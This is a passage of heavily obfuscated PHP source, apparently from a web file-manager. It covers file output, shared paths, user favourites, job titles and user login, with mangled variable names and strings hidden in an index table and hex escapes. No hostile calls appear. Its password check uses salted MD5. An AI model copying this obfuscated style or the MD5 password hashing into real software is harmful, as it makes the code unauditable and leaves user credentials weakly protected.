= 0) { $¿Â©Ü˜§ =& $_SERVER[ì™ı‰º¯]; $«ŸÔ‹¬ = $this->parse($Áóêúùã); $Œª˜™¨í = _get($GLOBALS[$¿Â©Ü˜§[7]], $¿Â©Ü˜§[1340]); $–Û¸¦øë = _get($GLOBALS[$¿Â©Ü˜§[7]], $¿Â©Ü˜§[1341]); $Áóêúùã = Model($¿Â©Ü˜§[601])->createFileName($«ŸÔ‹¬[$¿Â©Ü˜§[84]], $Œª˜™¨í, $–Û¸¦øë); return IO::uploadLink($Áóêúùã, $ò§ÓßÃñ); } public function fileNameAuto($ñ…À°ª–, $î¤“ ú, $‘ó–ÌÚ = REPEAT_REPLACE, $ª•‚¼½Æ = false) { return $this->model->fileNameAuto($ñ…À°ª–, $î¤“ ú, $‘ó–ÌÚ, $ª•‚¼½Æ); } public function fileNameExist($ÈØåÍĞ‘, $¯úÍÆ¨¢) { return $this->model->fileNameExist($ÈØåÍĞ‘, $¯úÍÆ¨¢); } protected function _fileOut($æ¿„æáó, $·ó‚Ğşæ = false, $€³¹şêØ = false, $š«õÂá = '', $¨¸Æ° = false) { $¸”‘›–é =& $_SERVER[ì™ı‰º¯]; $œòûÉ‚Ş = $this->model->sourceInfo($æ¿„æáó); if ($œòûÉ‚Ş[$¸”‘›–é[410]] == $¸”‘›–é[88]) { header($¸”‘›–é[1342]); die; } $´Ü«¥ñû = $this->model->fileInfoGet($æ¿„æáó); $š«õÂá = $´Ü«¥ñû[$¸”‘›–é[176]] ? $´Ü«¥ñû[$¸”‘›–é[176]] : $š«õÂá; $ñÕÎ§®¯ = isset($GLOBALS[$¸”‘›–é[1343]]) ? $GLOBALS[$¸”‘›–é[1343]] : $œòûÉ‚Ş[$¸”‘›–é[32]]; if ($¨¸Æ°) { return IO::fileOutServer($´Ü«¥ñû[$¸”‘›–é[84]], $·ó‚Ğşæ, $ñÕÎ§®¯, $š«õÂá); } IO::fileOut($´Ü«¥ñû[$¸”‘›–é[84]], $·ó‚Ğşæ, $ñÕÎ§®¯, $š«õÂá); } public function fileOut($†Ô ÛÀÈ, $ŒàßË¡å = false, $äçĞÏ = false, $Í¯ĞºæŒ = '') { $this->_fileOut($†Ô ÛÀÈ, $ŒàßË¡å, $äçĞÏ, $Í¯ĞºæŒ); } public function fileOutServer($Ñ½Â·Ï, $ì¶ì£ = false, $ùÛìœ¡ = false, $Ş“²ì“Â = '') { $this->_fileOut($Ñ½Â·Ï, $ì¶ì£, $ùÛìœ¡, $Ş“²ì“Â, !0); } protected function _fileOutImage($Ö›¹¿€Ÿ, $çĞËñ¤¦ = 250) { $Èøğå„Ö =& $_SERVER[ì™ı‰º¯]; $ÛˆõèÚ¢ = $this->model->pathInfo($Ö›¹¿€Ÿ); if ($ÛˆõèÚ¢[$Èøğå„Ö[410]] == $Èøğå„Ö[88]) { show_json($Èøğå„Ö[1344] . $Ö›¹¿€Ÿ, !1); } $Ù·İËğ = $this->model->fileInfoGet($Ö›¹¿€Ÿ); $Ù·İËğ[$Èøğå„Ö[32]] = $ÛˆõèÚ¢[$Èøğå„Ö[32]]; $Ù·İËğ[$Èøğå„Ö[169]] = $ÛˆõèÚ¢[$Èøğå„Ö[169]]; $GLOBALS[$Èøğå„Ö[1343]] = $Ù·İËğ[$Èøğå„Ö[32]]; $GLOBALS[$Èøğå„Ö[168]] = $Ù·İËğ; IO::fileOutImage($Ù·İËğ[$Èøğå„Ö[84]], $çĞËñ¤¦); } public function fileOutImage($ı°—«¥ƒ, $šğÑ‘ò = 250) { $this->_fileOutImage($ı°—«¥ƒ, $šğÑ‘ò); } public function fileOutImageServer($úÇ¦—š, $†ÈĞœª = 250) { $this->_fileOutImage($úÇ¦—š, $†ÈĞœª); } public function link($›¿Ü’³·, $‡®úÁŠ = '') { $©ÕšË¼ = $this->model->fileInfoGet($›¿Ü’³·); return IO::link($©ÕšË¼[$_SERVER[ì™ı‰º¯][84]], $‡®úÁŠ); } protected function parse($·û¶—Ÿß) { $©£–Û„ =& $_SERVER[ì™ı‰º¯]; if (strstr($·û¶—Ÿß, $©£–Û„[8]) === !1) { return array($©£–Û„[419] => intval($·û¶—Ÿß), $©£–Û„[84] => $©£–Û„[12], $©£–Û„[1339] => array()); } $«¨¶»ò– = explode($©£–Û„[8], trim($·û¶—Ÿß, $©£–Û„[8])); if (count($«¨¶»ò–) < 2) { show_tips(clear_html($·û¶—Ÿß) . $©£–Û„[1345]); } return array($©£–Û„[419] => intval($«¨¶»ò–[0]), $©£–Û„[84] => $«¨¶»ò–[1], $©£–Û„[1339] => array_slice($«¨¶»ò–, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($¶Ï­ê½¯) { $this->pathParse = $¶Ï­ê½¯; $this->model = Model($_SERVER[ì™ı‰º¯][1338]); } public function getPathOuter($¿îÜäÉ¬) { $Ö‡ŞÁ–õ =& $_SERVER[ì™ı‰º¯]; if (!$¿îÜäÉ¬) { return $¿îÜäÉ¬; } $ù¸Ï¸Èğ = $this->parse($¿îÜäÉ¬); return trim(KodIO::makeShare($this->pathParse[$Ö‡ŞÁ–õ[399]], $ù¸Ï¸Èğ[$Ö‡ŞÁ–õ[399]]), $Ö‡ŞÁ–õ[8]); } protected function infoParse($’›ÁÅà, $’£ğÆÎÍ = false, $“Æ¿ıß = false) { $Âó£şÀ =& $_SERVER[ì™ı‰º¯]; $á¡ı«å = $this->pathParse[$Âó£şÀ[399]]; $³›×Û‘“ = trim($this->pathParse[$Âó£şÀ[1167]], $Âó£şÀ[8]); return Action($Âó£şÀ[1346])->sharePathInfo($á¡ı«å, $³›×Û‘“, $’£ğÆÎÍ); } public function infoFull($‰Óåöä†) { $™Ù‹¥Äî =& $_SERVER[ì™ı‰º¯]; $¨ğÊ¤À• = explode($™Ù‹¥Äî[8], trim($‰Óåöä†, $™Ù‹¥Äî[8])); if (count($¨ğÊ¤À•) > 1) { $Š«¨ö¡ = implode($™Ù‹¥Äî[8], array_splice($¨ğÊ¤À•, 1)); $ºŒœ¢û¹ = $this->model->pathInfoByPath($¨ğÊ¤À•[0], $Š«¨ö¡); if (!$ºŒœ¢û¹) { return !1; } $this->pathParse[$™Ù‹¥Äî[1167]] = $ºŒœ¢û¹[$™Ù‹¥Äî[402]]; } return $this->infoParse($‰Óåöä†); } public function listAll($‰ùœƒ€ˆ) { $òŒĞ€ÛÚ =& $_SERVER[ì™ı‰º¯]; $ò«œø¤ = IO::info($this->pathParse[$òŒĞ€ÛÚ[84]]); if (!$ò«œø¤) { return array(); } $¸€öµ¦‘ = $this->model->listAll($‰ùœƒ€ˆ); $Ö˜ºˆõŠ = Model($òŒĞ€ÛÚ[592])->getInfo($ò«œø¤[$òŒĞ€ÛÚ[593]]); foreach ($¸€öµ¦‘ as &$¦šúÄš‡) { check_abort(); $¦šúÄš‡[$òŒĞ€ÛÚ[87]] = Action($òŒĞ€ÛÚ[1346])->_shareItemeParse($¦šúÄš‡[$òŒĞ€ÛÚ[87]], $Ö˜ºˆõŠ); } unset($¦šúÄš‡); return $¸€öµ¦‘; } } goto E–Øó„ƒœ; CÔï¬ØŠÉò: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\146\141\166"; protected function cacheFunctionAlias($î±–ìåñ) { $ÕÜÒ‡Œ— =& $_SERVER[ì™ı‰º¯]; return array($ÕÜÒ‡Œ—[1970] => array(USER_ID, $ÕÜÒ‡Œ—[2303])); } protected function listData() { $åòš˜üó =& $_SERVER[ì™ı‰º¯]; $—Œõ›ˆ¬ = array($åòš˜üó[1661] => USER_ID, $åòš˜üó[483] => 0); $†°ó¡“É = $åòš˜üó[2304]; $ÛÙ¬»âÊ = $this->field($†°ó¡“É)->where($—Œõ›ˆ¬)->order($åòš˜üó[2305])->select(); return $ÛÙ¬»âÊ ? $ÛÙ¬»âÊ : array(); } protected function resetCache() { } protected function listView() { $Â€ŞºÈÎ =& $_SERVER[ì™ı‰º¯]; $áÄ§¬°ó = $this->listData(); $Šá’®À = array_filter_by_field($áÄ§¬°ó, $Â€ŞºÈÎ[33], $Â€ŞºÈÎ[416]); $„Š—ñôæ = array_to_keyvalue($Šá’®À, $Â€ŞºÈÎ[12], $Â€ŞºÈÎ[84]); if (!$„Š—ñôæ) { return $áÄ§¬°ó; } $Ë×Å‹­­ = 2000; $®¸¯ï— = array($Â€ŞºÈÎ[417] => array($Â€ŞºÈÎ[418], $„Š—ñôæ)); $¾Ôã”Å = Model($Â€ŞºÈÎ[821])->listSource($®¸¯ï—, $Ë×Å‹­­); $¾Ôã”Å = array_merge($¾Ôã”Å[$Â€ŞºÈÎ[83]], $¾Ôã”Å[$Â€ŞºÈÎ[82]]); $¾Ôã”Å = array_to_keyvalue($¾Ôã”Å, $Â€ŞºÈÎ[402]); foreach ($áÄ§¬°ó as $†éšÆ³Ş => $İ¿¼àÂì) { $ÙŒÁÖŒ¹ = $¾Ôã”Å[$İ¿¼àÂì[$Â€ŞºÈÎ[84]]]; $ÙŒÁÖŒ¹ = $ÙŒÁÖŒ¹ ? $ÙŒÁÖŒ¹ : array(); $áÄ§¬°ó[$†éšÆ³Ş] = array_merge($ÙŒÁÖŒ¹, $İ¿¼àÂì); } return $áÄ§¬°ó; } protected function addFav($÷«ï¶¼Õ, $»¡ç×ı÷ = '', $ÎÙÂşò® = "\x73\157\x75\162\143\x65") { $«ìèË”½ =& $_SERVER[ì™ı‰º¯]; $î»æÙ¤ = array($«ìèË”½[1661] => USER_ID, $«ìèË”½[483] => 0, $«ìèË”½[422] => $ÎÙÂşò®, $«ìèË”½[421] => $÷«ï¶¼Õ); if ($this->where($î»æÙ¤)->find()) { return !1; } $î»æÙ¤ = array($«ìèË”½[1661] => USER_ID, $«ìèË”½[483] => 0); $¢şƒ˜”² = $this->where($î»æÙ¤)->max($«ìèË”½[1883]); if (!$¢şƒ˜”²) { $¢şƒ˜”² = 0; } if (!$»¡ç×ı÷ && $ÎÙÂşò® == $«ìèË”½[416]) { $ ĞİŒşØ = Model($«ìèË”½[1338])->where(array($«ìèË”½[417] => $÷«ï¶¼Õ))->find(); if (!$ ĞİŒşØ) { return !1; } $»¡ç×ı÷ = $ ĞİŒşØ[$«ìèË”½[32]]; } $»¡ç×ı÷ = $this->getAutoName($»¡ç×ı÷); $´‰¦œœ = array($«ìèË”½[1661] => USER_ID, $«ìèË”½[483] => 0, $«ìèË”½[420] => $»¡ç×ı÷, $«ìèË”½[421] => $÷«ï¶¼Õ, $«ìèË”½[422] => $ÎÙÂşò®, $«ìèË”½[1863] => $¢şƒ˜”² + 1); return $this->add($´‰¦œœ); } protected function remove($¥×ƒ…») { $‡ÏÖòå =& $_SERVER[ì™ı‰º¯]; $Ÿ£àùÚ× = array($‡ÏÖòå[1661] => USER_ID, $‡ÏÖòå[419] => $¥×ƒ…»); return $this->where($Ÿ£àùÚ×)->delete(); } protected function removeByName($È»Û£¹¸) { $ı“ã›´• =& $_SERVER[ì™ı‰º¯]; $‘¬âÅ = array($ı“ã›´•[1661] => USER_ID, $ı“ã›´•[420] => $È»Û£¹¸, $ı“ã›´•[483] => 0); return $this->where($‘¬âÅ)->delete(); } protected function rename($¨ÔÅ‰, $ıŸËù¨«) { $Œ·Õ¨Äô =& $_SERVER[ì™ı‰º¯]; if ($¨ÔÅ‰ == $ıŸËù¨«) { return !1; } $ƒ‚¡Ò† = $this->getAutoName($ıŸËù¨«); if ($ıŸËù¨« != $ƒ‚¡Ò†) { return !1; } $¶•Øù“Û = array($Œ·Õ¨Äô[1661] => USER_ID, $Œ·Õ¨Äô[483] => 0, $Œ·Õ¨Äô[32] => $¨ÔÅ‰); return $this->where($¶•Øù“Û)->save(array($Œ·Õ¨Äô[32] => $ıŸËù¨«)); } protected function resetSort($ÅŒİÇ¥ã) { $“Ğ¸Ã‹ =& $_SERVER[ì™ı‰º¯]; $ÅŒİÇ¥ã = is_array($ÅŒİÇ¥ã) ? $ÅŒİÇ¥ã : array(); $«‚”³ = array($“Ğ¸Ã‹[1661] => USER_ID); for ($³–”†ë± = 0; $³–”†ë± < count($ÅŒİÇ¥ã); $³–”†ë±++) { $«‚”³[$“Ğ¸Ã‹[419]] = $ÅŒİÇ¥ã[$³–”†ë±]; $this->where($«‚”³)->save(array($“Ğ¸Ã‹[1863] => $³–”†ë± + 1)); } return !0; } protected function moveTop($Ë§“ãÚª) { $…“œÎ« =& $_SERVER[ì™ı‰º¯]; $ÈÙ°İ½„ = array($…“œÎ«[1661] => USER_ID, $…“œÎ«[483] => 0); $Å‚ñô„ú = $this->where($ÈÙ°İ½„)->where(array($…“œÎ«[32] => $Ë§“ãÚª))->find(); if (!$Å‚ñô„ú) { return; } $íÖêµˆâ = $this->field($…“œÎ«[399])->where($ÈÙ°İ½„)->order($…“œÎ«[2305])->select(); $íÖêµˆâ = array_to_keyvalue($íÖêµˆâ, $…“œÎ«[12], $…“œÎ«[399]); $ŒÄ•æùœ = $íÖêµˆâ; $íÖêµˆâ = array_remove_value($íÖêµˆâ, $Å‚ñô„ú[$…“œÎ«[399]]); array_unshift($íÖêµˆâ, $Å‚ñô„ú[$…“œÎ«[399]]); return $this->resetSort($íÖêµˆâ); } protected function moveBottom($æíã¹Äå) { $ıú”½º¹ =& $_SERVER[ì™ı‰º¯]; $‡¨³ªĞ = array($ıú”½º¹[1661] => USER_ID, $ıú”½º¹[483] => 0); $Ğ£é“â² = $this->where($‡¨³ªĞ)->max($ıú”½º¹[1883]); $³ØıìÇá = array($ıú”½º¹[1883] => $Ğ£é“â² + 1); return $this->where($‡¨³ªĞ)->where(array($ıú”½º¹[32] => $æíã¹Äå))->save($³ØıìÇá); } private function getAutoName($Á“•óãÀ) { $ˆÔ÷¦ÛÆ =& $_SERVER[ì™ı‰º¯]; $à«Şµ®š = array($ˆÔ÷¦ÛÆ[1661] => USER_ID, $ˆÔ÷¦ÛÆ[483] => 0); $à¦ÅÛƒ« = $this->field($ˆÔ÷¦ÛÆ[32])->where($à«Şµ®š)->select(); $à¦ÅÛƒ« = array_to_keyvalue($à¦ÅÛƒ«, $ˆÔ÷¦ÛÆ[12], $ˆÔ÷¦ÛÆ[32]); if (!$à¦ÅÛƒ« || !in_array($Á“•óãÀ, $à¦ÅÛƒ«)) { return $Á“•óãÀ; } for ($ÜÌ¾ÄÏ = 0; $ÜÌ¾ÄÏ < count($à¦ÅÛƒ«); $ÜÌ¾ÄÏ++) { if (!in_array($Á“•óãÀ . "\50{$ÜÌ¾ÄÏ}\51", $à¦ÅÛƒ«)) { return $Á“•óãÀ . "\50{$ÜÌ¾ÄÏ}\51"; } } return $Á“•óãÀ . "\x28{$ÜÌ¾ÄÏ}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\56\x6a\x6f\x62\114\x69\x73\x74"; public $field = array("\156\x61\155\145", "\144\x65\x73\x63", "\163\x6f\x72\164"); const JOB_KEY = "\163\x65\x6c\x66\112\157\142\114\151\163\164"; public function listData($ÀèçÓû¹ = false, $á¯œö€† = "\163\157\x72\x74", $Òã³ßµ‡ = false) { return parent::listData($ÀèçÓû¹, $á¯œö€†, $Òã³ßµ‡); } public function remove($„©†Í) { return parent::remove($„©†Í); } public function add($øÀ¼ûôœ) { $¼ÚªåÁÇ =& $_SERVER[ì™ı‰º¯]; if ($this->findByName($øÀ¼ûôœ[$¼ÚªåÁÇ[32]])) { return !1; } $øÀ¼ûôœ[$¼ÚªåÁÇ[1883]] = $this->getSort(); return parent::insert($øÀ¼ûôœ); } private function getSort() { $áÖóæ—ö =& $_SERVER[ì™ı‰º¯]; $áùğˆáì = parent::listData(); $¤õ¡Ù‡ = array_to_keyvalue($áùğˆáì, $áÖóæ—ö[12], $áÖóæ—ö[1883]); return empty($¤õ¡Ù‡) ? 0 : max($¤õ¡Ù‡) + 1; } public function update($…¤ğß, $¨©Íß‰¥) { $ÏÌ´ò±Ü =& $_SERVER[ì™ı‰º¯]; $ï®ºâ§“ = parent::listData($…¤ğß); $ÏÈ÷Ôè´ = $this->findByName($¨©Íß‰¥[$ÏÌ´ò±Ü[32]]); if (!$ï®ºâ§“ || $ÏÈ÷Ôè´ && $ÏÈ÷Ôè´[$ÏÌ´ò±Ü[399]] != $ï®ºâ§“[$ÏÌ´ò±Ü[399]]) { return !1; } return parent::update($…¤ğß, $¨©Íß‰¥); } public function setUserJob($•Ü‚†°Ì, $””¿í»ê) { $ê‹°ıâî =& $_SERVER[ì™ı‰º¯]; if (!is_array($””¿í»ê)) { $””¿í»ê = array($””¿í»ê); } $œÏßìˆ• = parent::listData(); $…œµ˜¼ = array_to_keyvalue($œÏßìˆ•, $ê‹°ıâî[32]); $¢Æ¶ĞÓß = $ê‹°ıâî[378]; foreach ($””¿í»ê as $ä‘ÌøÈ) { if ($…œµ˜¼[$ä‘ÌøÈ]) { $¢Æ¶ĞÓß .= $…œµ˜¼[$ä‘ÌøÈ][$ê‹°ıâî[399]] . $ê‹°ıâî[50]; } else { $ÁŞ£Â“Û = $this->add($ä‘ÌøÈ); $¢Æ¶ĞÓß .= $ÁŞ£Â“Û . $ê‹°ıâî[50]; } } $¢Æ¶ĞÓß = rtrim($¢Æ¶ĞÓß, $ê‹°ıâî[50]); Model($ê‹°ıâî[525])->metaSet($•Ü‚†°Ì, self::JOB_KEY, $¢Æ¶ĞÓß); } public function getUserJob($°Ñ­¢ÍŒ) { $Ï¹¢Ï„ = Model($_SERVER[ì™ı‰º¯][525])->metaGet($°Ñ­¢ÍŒ); return $this->getUserJobInfo($Ï¹¢Ï„[self::JOB_KEY]); } public function getUserJobInfo($×şºßõŞ) { $¹‘Í†Ü¼ =& $_SERVER[ì™ı‰º¯]; $æ¬ÜùÃğ = explode($¹‘Í†Ü¼[50], $×şºßõŞ); $áÏæ­£î = parent::listData(); $áÏæ­£î = array_remove_key($áÏæ­£î, $¹‘Í†Ü¼[201]); $îî”ŒÏ° = array(); foreach ($æ¬ÜùÃğ as $ù—ç ÷•) { if (isset($áÏæ­£î[$ù—ç ÷•])) { $îî”ŒÏ°[] = $áÏæ­£î[$ù—ç ÷•]; } } return $îî”ŒÏ°; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\145\162"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\141\x6d\x65" => "\x75\x73\x65\162\x5f\155\145\x74\x61", "\x6d\145\x74\x61\x46\x69\x65\154\x64" => "\165\163\145\x72\111\104"); protected $simpleField = "\x75\163\145\x72\x49\104\x2c\156\151\143\x6b\116\x61\155\x65\54\x6e\141\x6d\145\x2c\x61\166\x61\164\x61\162\x2c\x73\145\x78\x2c\x73\x74\x61\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ÅĞ¬Şı) { $ã€À¡·é =& $_SERVER[ì™ı‰º¯]; $»»µÈ£Ò = $ã€À¡·é[2306]; return array($ã€À¡·é[1937] => array($ÅĞ¬Şı[0], $»»µÈ£Ò), $ã€À¡·é[1939] => array($ÅĞ¬Şı[0], $»»µÈ£Ò), $ã€À¡·é[2307] => array($ÅĞ¬Şı[0], $»»µÈ£Ò)); } protected function getInfo($ÌËÊíçˆ, $©Àâ•¹ª = false) { $Ø‡·³–’ = $this->getInfoSimple($ÌËÊíçˆ); if (!is_array($Ø‡·³–’)) { return array(); } if ($©Àâ•¹ª) { return $this->_getInfoApply($Ø‡·³–’); } return $this->cacheFunctionGet($_SERVER[ì™ı‰º¯][1941], $ÌËÊíçˆ); } protected function getInfoFull($ğ—Íâ‡, $íß—á¡ = false) { $Í®ıÉ´É = $this->getInfoSimple($ğ—Íâ‡); if (!is_array($Í®ıÉ´É)) { return array(); } if ($íß—á¡) { return $this->_getInfoApply($Í®ıÉ´É, !0); } return $this->cacheFunctionGet($_SERVER[ì™ı‰º¯][2308], $ğ—Íâ‡); } private function _getInfoApply($¡úÒß¨, $¤¢ãÜ¬¾ = false) { $ÍßÃ“ã =& $_SERVER[ì™ı‰º¯]; if (!$¡úÒß¨) { return $¡úÒß¨; } $¬˜¬êÄì = md5($ÍßÃ“ã[2309] . $¡úÒß¨[$ÍßÃ“ã[888]] . $ÍßÃ“ã[2310] . $¡úÒß¨[$ÍßÃ“ã[32]]); $¡úÒß¨ = $this->_listDataApplyItem($¡úÒß¨); $®ŠÄúöÅ = Model($ÍßÃ“ã[1338])->metaGet($¡úÒß¨[$ÍßÃ“ã[87]][$ÍßÃ“ã[402]]); $¡úÒß¨[$ÍßÃ“ã[2311]] = $¬˜¬êÄì; $¡úÒß¨[$ÍßÃ“ã[87]][$ÍßÃ“ã[2132]] = isset($®ŠÄúöÅ[$ÍßÃ“ã[2133]]) ? $®ŠÄúöÅ[$ÍßÃ“ã[2133]] : null; if ($¤¢ãÜ¬¾) { $¡úÒß¨[$ÍßÃ“ã[466]] = $this->metaGet($¡úÒß¨[$ÍßÃ“ã[1670]]); } return $¡úÒß¨; } protected function getInfoSimple($áØÎ‡Â, $¶³ı•– = false) { $È¼Ö£û =& $_SERVER[ì™ı‰º¯]; if (!$áØÎ‡Â) { return array(); } if ($¶³ı•–) { $ç²“Í¹á = $this->where(array($È¼Ö£û[1670] => intval($áØÎ‡Â)))->find(); if (!is_array($ç²“Í¹á)) { return array(); } $ç²“Í¹á[$È¼Ö£û[533]] = Action($È¼Ö£û[2312])->parseUrl($ç²“Í¹á[$È¼Ö£û[533]]); return $ç²“Í¹á; } return $this->cacheFunctionGet($È¼Ö£û[1942], $áØÎ‡Â); } protected function getInfoSimpleOuter($ˆäµùâš) { $ğÇëÙÅ =& $_SERVER[ì™ı‰º¯]; if (!$ˆäµùâš || $ˆäµùâš == 0) { return array($ğÇëÙÅ[1670] => $ğÇëÙÅ[198], $ğÇëÙÅ[32] => $ğÇëÙÅ[162] . LNG($ğÇëÙÅ[2313]) . $ğÇëÙÅ[164], $ğÇëÙÅ[533] => STATIC_PATH . $ğÇëÙÅ[2314]); } $ğ¬€´û¬ = $this->cacheFunctionGet($ğÇëÙÅ[1942], $ˆäµùâš); $ü€Ş¤ÌÍ = array_field_key($ğ¬€´û¬, explode($ğÇëÙÅ[50], $this->simpleField)); if (!$ü€Ş¤ÌÍ) { return array($ğÇëÙÅ[1670] => $ğÇëÙÅ[1187], $ğÇëÙÅ[32] => $ğÇëÙÅ[162] . LNG($ğÇëÙÅ[2315]) . $ğÇëÙÅ[164], $ğÇëÙÅ[533] => STATIC_PATH . $ğÇëÙÅ[2316]); } $ü€Ş¤ÌÍ[$ğÇëÙÅ[533]] = Action($ğÇëÙÅ[2312])->parseUrl($ü€Ş¤ÌÍ[$ğÇëÙÅ[533]]); return $ü€Ş¤ÌÍ; } protected function groupUser($çËš¬ ) { } public static function errorLang($ÃÕùëŠ) { $‹€³Óù¾ =& $_SERVER[ì™ı‰º¯]; $ĞÔğ¨ = array(self::ERROR_USER_NOT_EXISTS => $‹€³Óù¾[2317], self::ERROR_USER_PASSWORD_ERROR => $‹€³Óù¾[2318], self::ERROR_USER_EXIST_NAME => $‹€³Óù¾[2319], self::ERROR_USER_EXIST_PHONE => $‹€³Óù¾[2320], self::ERROR_USER_EXIST_EMAIL => $‹€³Óù¾[2321], self::ERROR_USER_LOGIN_LOCK => $‹€³Óù¾[2322], self::ERROR_IP_NOT_ALLOW => $‹€³Óù¾[2323], self::ERROR_USER_EXIST_NICKNAME => $‹€³Óù¾[2324]); return LNG($ĞÔğ¨[$ÃÕùëŠ]); } public function getInfoByMeta($´»±ÙÑ›, $Ù¼œ£Õ) { $ëÆö¶Íš =& $_SERVER[ì™ı‰º¯]; $ìÀîøâ = Model($ëÆö¶Íš[2325])->where(array($ëÆö¶Íš[94] => $´»±ÙÑ›, $ëÆö¶Íš[374] => $Ù¼œ£Õ))->find(); if ($ìÀîøâ) { return $this->getInfo($ìÀîøâ[$ëÆö¶Íš[1670]]); } return !1; } public function userLoginCheck($ßñÖ¼…, $à¶ÆÏŸƒ) { $±ã…”Öû =& $_SERVER[ì™ı‰º¯]; $¸àäÑ² = $this->userLoginFind($ßñÖ¼…); if (!$¸àäÑ²) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($¸àäÑ²[$±ã…”Öû[1670]], $à¶ÆÏŸƒ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($¸àäÑ²[$±ã…”Öû[1670]]); } public function userLoginFind($™øïÓ»£) { $‹«„Ëš¹ =& $_SERVER[ì™ı‰º¯]; $¦Õ®²ìá = array($‹«„Ëš¹[32] => $™øïÓ»£, $‹«„Ëš¹[532] => $™øïÓ»£, $‹«„Ëš¹[305] => $™øïÓ»£, $‹«„Ëš¹[2326] => $™øïÓ»£, $‹«„Ëš¹[999] => $‹«„Ëš¹[1001]); if ($this->nickNameRpt()) { unset($¦Õ®²ìá[$‹«„Ëš¹[532]]); } return $this->where($¦Õ®²ìá)->find(); } public function clearCache($¯ŸáÀ¯¶) { $…šƒ÷¶¨ =& $_SERVER[ì™ı‰º¯]; $this->cacheFunctionClear($…šƒ÷¶¨[1941], $¯ŸáÀ¯¶); $this->cacheFunctionClear($…šƒ÷¶¨[1942], $¯ŸáÀ¯¶); $this->cacheFunctionClear($…šƒ÷¶¨[2308], $¯ŸáÀ¯¶); } public function userPasswordCheck($ß·‚»©†, $¸¾¥Ù÷Ê) { $‰““Û =& $_SERVER[ì™ı‰º¯]; $¸»¯Å—¯ = $this->where(array($‰““Û[1670] => intval($ß·‚»©†)))->find(); $µ¥ëÖ‚µ = $this->metaGet($ß·‚»©†); $øØÚÑĞ = isset($µ¥ëÖ‚µ[$‰““Û[2327]]) ? $µ¥ëÖ‚µ[$‰““Û[2327]] : $‰““Û[12]; if (md5($øØÚÑĞ . trim($¸¾¥Ù÷Ê)) !== $¸»¯Å—¯[$‰““Û[888]]) { return !1; } return !0; } public function userAdd($§ªÂÆç) { $Ô±‡§ö =& $_SERVER[ì™ı‰º¯]; $ŒÕšÖòë = array($Ô±‡§ö[420] => $§ªÂÆç[$Ô±‡§ö[32]], $Ô±‡§ö[2328] => $§ªÂÆç[$Ô±‡§ö[1550]], $Ô±‡§ö[2329] => isset($§ªÂÆç[$Ô±‡§ö[305]]) ? $§ªÂÆç[$Ô±‡§ö[305]] : $Ô±‡§ö[12], $Ô±‡§ö[2330] => isset($§ªÂÆç[$Ô±‡§ö[2326]]) ? $§ªÂÆç[$Ô±‡§ö[2326]] : $Ô±‡§ö[12], $Ô±‡§ö[2331] => isset($§ªÂÆç[$Ô±‡§ö[532]]) ? $§ªÂÆç[$Ô±‡§ö[532]] : $§ªÂÆç[$Ô±‡§ö[32]], $Ô±‡§ö[2332] => isset($§ªÂÆç[$Ô±‡§ö[533]]) ? $§ªÂÆç[$Ô±‡§ö[533]] : $Ô±‡§ö[12], $Ô±‡§ö[2333] => isset($§ªÂÆç[$Ô±‡§ö[2334]]) ? $§ªÂÆç[$Ô±‡§ö[2334]] : 1, $Ô±‡§ö[2335] => $§ªÂÆç[$Ô±‡§ö[888]], $Ô±‡§ö[1943] => isset($§ªÂÆç[$Ô±‡§ö[1846]]) ? $§ªÂÆç[$Ô±‡§ö[1846]] : 1024 * 1024 * 20, $Ô±‡§ö[1944] => 0, $Ô±‡§ö[2336] => 0, $Ô±‡§ö[1988] => isset($§ªÂÆç[$Ô±‡§ö[745]]) ? $§ªÂÆç[$Ô±‡§ö[745]] : 1); if (!empty($§ªÂÆç[$Ô±‡§ö[1670]])) { $ŒÕšÖòë[$Ô±‡§ö[1670]] = $§ªÂÆç[$Ô±‡§ö[1670]]; } $­‡ÎÊ« = $this->_checkExist($§ªÂÆç); if ($­‡ÎÊ« !== !0) { return $­‡ÎÊ«; } if (!empty($ŒÕšÖòë[$Ô±‡§ö[533]]) && strlen($ŒÕšÖòë[$Ô±‡§ö[533]]) > 255) { $ŒÕšÖòë[$Ô±‡§ö[533]] = $Ô±‡§ö[12]; } $ü¯ŞáŞì = $this->add($ŒÕšÖòë); $¼·´Û‚ = array($Ô±‡§ö[2335] => $ŒÕšÖòë[$Ô±‡§ö[888]], $Ô±‡§ö[2331] => $ŒÕšÖòë[$Ô±‡§ö[532]]); $this->userEdit($ü¯ŞáŞì, $¼·´Û‚); Model($Ô±‡§ö[1338])->userRootAdd($ü¯ŞáŞì); return $ü¯ŞáŞì; } protected function userEditTest($øšÊù, $ÇĞ¼§´š) { return $this->call($_SERVER[ì™ı‰º¯][2337], $øšÊù, $ÇĞ¼§´š); } protected function userEdit($ÁºÃ¾ñ, $£¥‘ğß£) { $Üş™ƒüÏ =& $_SERVER[ì™ı‰º¯]; $ºß™à¸é = $this->getInfoSimple($ÁºÃ¾ñ); if (!$ºß™à¸é) { return !1; } $šïÔÒ‚˜ = $this->_checkExist($£¥‘ğß£, $ÁºÃ¾ñ); if ($šïÔÒ‚˜ !== !0) { return $šïÔÒ‚˜; } if (isset($£¥‘ğß£[$Üş™ƒüÏ[888]]) && trim($£¥‘ğß£[$Üş™ƒüÏ[888]]) != $Üş™ƒüÏ[12]) { $šİÖ˜å = $this->metaGet($ÁºÃ¾ñ); if (empty($šİÖ˜å[$Üş™ƒüÏ[2327]])) { $šİÖ˜å[$Üş™ƒüÏ[2327]] = rand_string(10); Model($Üş™ƒüÏ[504])->metaSet($ÁºÃ¾ñ, $Üş™ƒüÏ[2327], $šİÖ˜å[$Üş™ƒüÏ[2327]]); } $£¥‘ğß£[$Üş™ƒüÏ[888]] = 